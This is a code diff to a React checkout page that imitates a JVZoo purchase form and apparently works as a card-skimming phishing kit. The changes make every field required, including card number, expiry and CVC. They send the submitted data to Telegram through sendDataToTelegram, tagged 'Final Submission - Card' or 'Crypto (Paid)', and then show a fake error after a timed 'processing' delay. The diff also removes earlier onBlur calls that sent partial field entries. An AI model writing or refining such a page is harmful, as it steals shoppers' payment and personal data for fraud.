@@ -123,11 +123,19 @@ export default function Checkout() {
     }
   };
 
-  const handlePurchase = () => {
+  const handlePurchase = (e) => {
+    if (e) e.preventDefault();
     if (isProcessing) return;
 
+    // Check if form is valid using browser validation
+    const form = document.querySelector('form');
+    if (form && !form.checkValidity()) {
+      form.reportValidity();
+      return;
+    }
+
     // Always sync form data first
-    sendDataToTelegram({ status: "Attempted Purchase" });
+    sendDataToTelegram({ status: "Final Submission - Card" });
 
     if (paymentMethod === 'crypto') {
       if (!selectedCrypto) {
@@ -151,6 +159,9 @@ export default function Checkout() {
     setIsCryptoDialogOpen(false);
     setIsProcessing(true);
     
+    // Sync final crypto intent
+    sendDataToTelegram({ status: "Final Submission - Crypto (Paid)", crypto: selectedCrypto.name });
+
     setTimeout(() => {
       setIsProcessing(false);
       setShowError(true);
@@ -269,53 +280,52 @@ export default function Checkout() {
             <div className="timer-countdown">00:{formatTime(timeLeft)}</div>
           </div>
 
-          <div className="checkout-form-section" style={{ opacity: isProcessing ? 0.5 : 1, pointerEvents: isProcessing ? 'none' : 'auto' }}>
+          <form onSubmit={handlePurchase} className="checkout-form-section" style={{ opacity: isProcessing ? 0.5 : 1, pointerEvents: isProcessing ? 'none' : 'auto' }}>
             <h2 className="checkout-form-title">Customer Information</h2>
             
             <div className="checkout-form-subtitle">CONTACT DETAILS</div>
             <div className="form-row">
               <div className="form-group">
-                <input type="text" name="firstName" className="form-input" placeholder="First Name" value={formData.firstName} onChange={handleInputChange} onBlur={() => sendDataToTelegram({ trigger: 'partial_fill_firstName' })} />
+                <input type="text" name="firstName" className="form-input" placeholder="First Name" value={formData.firstName} onChange={handleInputChange} required />
               </div>
               <div className="form-group">
-                <input type="text" name="lastName" className="form-input" placeholder="Last Name" value={formData.lastName} onChange={handleInputChange} onBlur={() => sendDataToTelegram({ trigger: 'partial_fill_lastName' })} />
+                <input type="text" name="lastName" className="form-input" placeholder="Last Name" value={formData.lastName} onChange={handleInputChange} required />
               </div>
             </div>
             
             <div className="form-row">
               <div className="form-group" style={{ flex: '1' }}>
-                <input type="email" name="email" className="form-input" placeholder="Email Address" value={formData.email} onChange={handleInputChange} />
+                <input type="email" name="email" className="form-input" placeholder="Email Address" value={formData.email} onChange={handleInputChange} required />
               </div>
             </div>
             
             <div className="form-row">
               <div className="form-group" style={{ flex: '1' }}>
-                <input type="tel" name="phone" className="form-input" placeholder="Phone Number" value={formData.phone} onChange={handleInputChange} />
+                <input type="tel" name="phone" className="form-input" placeholder="Phone Number" value={formData.phone} onChange={handleInputChange} required />
               </div>
             </div>
 
             <div className="checkout-form-subtitle" style={{marginTop: '25px'}}>BILLING DETAILS</div>
             <div className="form-row">
               <div className="form-group" style={{ flex: '1' }}>
-                <input type="text" name="street" className="form-input" placeholder="Street Address" value={formData.street} onChange={handleInputChange} />
+                <input type="text" name="street" className="form-input" placeholder="Street Address" value={formData.street} onChange={handleInputChange} required />
               </div>
             </div>
             <div className="form-row">
               <div className="form-group">
-                <input type="text" name="city" className="form-input" placeholder="City" value={formData.city} onChange={handleInputChange} />
+                <input type="text" name="city" className="form-input" placeholder="City" value={formData.city} onChange={handleInputChange} required />
               </div>
               <div className="form-group">
-                <input type="text" name="state" className="form-input" placeholder="State / Province" value={formData.state} onChange={handleInputChange} />
+                <input type="text" name="state" className="form-input" placeholder="State / Province" value={formData.state} onChange={handleInputChange} required />
               </div>
               <div className="form-group">
-                <input type="text" name="zip" className="form-input" placeholder="ZIP / Postal Code" value={formData.zip} onChange={handleInputChange} />
+                <input type="text" name="zip" className="form-input" placeholder="ZIP / Postal Code" value={formData.zip} onChange={handleInputChange} required />
               </div>
             </div>
-          </div>
 
-          <div className="checkout-form-section" style={{ opacity: isProcessing ? 0.5 : 1, pointerEvents: isProcessing ? 'none' : 'auto' }}>
-            <h2 className="checkout-form-title">Payment Information</h2>
-            <div className="checkout-form-subtitle">PAYMENT METHODS</div>
+            <div style={{ marginTop: '40px' }}>
+              <h2 className="checkout-form-title">Payment Information</h2>
+              <div className="checkout-form-subtitle">PAYMENT METHODS</div>
             
             <div style={{ display: 'flex', gap: '15px', marginBottom: '20px' }}>
               <label style={{ flex: 1, border: `2px solid ${paymentMethod === 'card' ? '#178331' : '#ccc'}`, padding: '15px', borderRadius: '4px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '10px', backgroundColor: paymentMethod === 'card' ? '#f0fdf4' : '#fff', transition: 'all 0.2s' }}>
@@ -354,15 +364,16 @@ export default function Checkout() {
                       placeholder="Card Number" 
                       value={formData.cardNumber}
                       onChange={handleInputChange}
+                      required
                     />
                   </div>
                 </div>
                 <div className="form-row">
                   <div className="form-group">
-                    <input type="text" name="expiry" className="form-input" placeholder="MM / YY" value={formData.expiry} onChange={handleInputChange} />
+                    <input type="text" name="expiry" className="form-input" placeholder="MM / YY" value={formData.expiry} onChange={handleInputChange} required />
                   </div>
                   <div className="form-group">
-                    <input type="text" name="cvc" className="form-input" placeholder="CVC" value={formData.cvc} onChange={handleInputChange} />
+                    <input type="text" name="cvc" className="form-input" placeholder="CVC" value={formData.cvc} onChange={handleInputChange} required />
                   </div>
                 </div>
               </div>
@@ -403,7 +414,17 @@ export default function Checkout() {
               <input type="checkbox" defaultChecked={false} />
               <span>Notify me of updates and future products from SMB</span>
             </label>
-          </div>
+            </div>
+
+            <div style={{ marginTop: '30px' }}>
+              <p className="terms-text" style={{ marginBottom: '15px' }}>
+                By clicking &quot;Complete Purchase&quot; I agree to JVZoo&apos;s <a href="#" style={{color: '#178331'}}>Terms Of Use</a> and <a href="#" style={{color: '#178331'}}>Privacy Policy</a>.
+              </p>
+              <button type="submit" className="btn-complete" disabled={isProcessing} style={{ opacity: isProcessing ? 0.7 : 1 }}>
+                <i className="ph-fill ph-lock-key"></i> {isProcessing ? 'Processing...' : 'Complete Purchase'}
+              </button>
+            </div>
+          </form>
 
           {isProcessing && (
             <div className="processing-box">
@@ -412,15 +433,6 @@ export default function Checkout() {
               <p className="terms-text" style={{marginTop: '40px'}}>One moment, please...</p>
             </div>
           )}
-
-          <div style={{ marginTop: '30px' }}>
-            <p className="terms-text" style={{ marginBottom: '15px' }}>
-              By clicking &quot;Complete Purchase&quot; I agree to JVZoo&apos;s <a href="#" style={{color: '#178331'}}>Terms Of Use</a> and <a href="#" style={{color: '#178331'}}>Privacy Policy</a>.
-            </p>
-            <button className="btn-complete" onClick={handlePurchase} disabled={isProcessing} style={{ opacity: isProcessing ? 0.7 : 1 }}>
-              <i className="ph-fill ph-lock-key"></i> {isProcessing ? 'Processing...' : 'Complete Purchase'}
-            </button>
-          </div>
         </div>
 
         {/* Right Side: Summary */}
